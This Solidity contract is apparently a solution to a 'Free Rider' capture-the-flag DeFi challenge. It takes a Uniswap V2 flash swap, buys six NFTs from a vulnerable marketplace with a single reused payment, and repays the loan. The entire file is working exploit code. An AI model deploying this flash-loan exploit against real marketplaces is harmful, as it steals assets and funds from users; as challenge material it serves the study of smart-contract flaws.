// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import './FreeRiderNFTMarketplace.sol';

interface IWETH {
    function deposit() external payable;    
    function withdraw(uint wad) external;
}

/**
 * @title FreeRiderBuyer
 * @author Edoardo Ierina
 */
contract FreeRiderAttackContract is IUniswapV2Callee, IERC721Receiver {

    using Address for address payable;

    IUniswapV2Pair immutable pair;
    address payable immutable marketPlaceAddress;
    uint256[] tokenIds = [uint256(0), 1, 2, 3, 4, 5];

    constructor(address nftAddress, address pairAddress, address payable marketAddress) {
        pair = IUniswapV2Pair(pairAddress);
        marketPlaceAddress = marketAddress;
        IERC721(nftAddress).setApprovalForAll(msg.sender, true);
    }

    function attack(uint amount) external payable {
        pair.swap(amount, 0, address(this), bytes('$'));
    }

    function uniswapV2Call(address, uint amount0, uint, bytes calldata) external override {

        address tokenAddress = pair.token0();

        IWETH weth = IWETH(tokenAddress);
        IERC20 wethToken = IERC20(tokenAddress);

        weth.withdraw(amount0);

        marketPlaceAddress.functionCallWithValue(
            abi.encodeWithSignature(
                "buyMany(uint256[])",
                tokenIds
            ),
            amount0
        );

        uint balance = address(this).balance;
        wethToken.approve(address(this), balance);
        weth.deposit{ value: balance }();
        wethToken.transfer(msg.sender, wethToken.balanceOf(address(this)));
    }

    function onERC721Received(address, address, uint256, bytes memory) pure external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
